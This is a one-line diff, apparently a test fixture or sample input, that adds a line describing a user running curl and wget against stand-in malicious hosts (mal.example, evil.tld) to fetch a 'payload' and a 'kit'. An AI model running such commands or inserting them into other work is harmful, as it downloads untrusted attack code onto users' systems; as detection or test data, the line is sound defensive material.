@@ -1,0 +1,1 @@
+user runs curl http://mal.example/payload and wget https://evil.tld/kit
